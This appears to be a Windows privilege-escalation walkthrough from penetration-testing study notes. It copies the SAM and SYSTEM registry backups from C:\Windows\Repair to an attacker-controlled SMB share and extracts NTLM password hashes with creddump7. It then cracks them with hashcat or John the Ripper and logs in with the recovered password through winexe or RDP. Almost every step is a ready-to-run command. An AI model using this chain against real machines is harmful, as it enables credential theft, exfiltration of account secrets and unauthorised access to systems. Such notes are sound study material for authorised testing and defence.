
---

### 📁 **Step 1: Identify and Transfer Insecure Backups**

Windows stores backup copies of critical registry hives here:

```
C:\Windows\Repair\
```

You’ll grab:

- `SAM`: Stores **user account hashes**
    
- `SYSTEM`: Contains **boot key** needed to decrypt the hashes
    

📤 Transfer them to Kali over SMB:

```cmd
sudo /usr/share/doc/python3-impacket/examples/smbserver.py kali $(pwd) -smb2support


copy C:\Windows\Repair\SAM \\10.10.10.10\kali\
copy C:\Windows\Repair\SYSTEM \\10.10.10.10\kali\
```

---

### 🧪 **Step 2: Extract Hashes Using creddump7**

💡 The Kali version of `creddump7` is outdated — clone the working version:

```bash
git clone https://github.com/Tib3rius/creddump7
```

Install the required dependency:

```bash
pip3 install pycrypto
```

Now extract the hashes:

```bash
python3 creddump7/pwdump.py SYSTEM SAM
```

➡️ Output will include lines like:

```
admin:500:aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>:::
```

---

### 🔓 **Step 3: Crack the Hash with Hashcat**

```bash
hashcat -m 1000 --force <NTLM_HASH> /usr/share/wordlists/rockyou.txt

or

echo 'admin:a9fdfa038c4b75ebc76dc855dd74f0da' > hash.txt
john --format=NT hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

```

- `-m 1000`: Hash type for NTLM
    
- Replace `<NTLM_HASH>` with the actual hash (just the 2nd hash value)
    
- `rockyou.txt`: Common password wordlist
    

Hashcat will output the cracked password when it finds a match.

---

### 🛠️ **Step 4: Use Cracked Password to Access System**

If you cracked the password (e.g., `admin:password123`), you can log in via:

#### A) **winexe:**

```bash
winexe -U 'admin%password123' //MACHINE_IP cmd.exe
```

#### B) **RDP:**

```bash
rdesktop MACHINE_IP
```

Log in using:

- **Username:** admin
    
- **Password:** (the one you cracked)
    

---
